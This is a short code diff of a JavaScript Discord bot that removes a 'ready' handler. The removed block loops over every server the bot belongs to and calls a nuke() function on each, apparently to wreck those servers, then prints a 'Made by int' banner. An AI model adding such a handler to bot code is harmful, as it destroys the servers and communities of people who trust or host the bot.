@@ -15,13 +15,4 @@ client.on("message", message => {
 };     
 });
 
-LOka.on('ready', () => {
-  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
-  console.log('-------------------------------------------------------------');
-  console.log('');
-  console.log("Made by int");
-  console.log("");
-  console.log("-------------------------------------------------------------");
- 
-
 client.login(process.env.BOT_TOKEN);
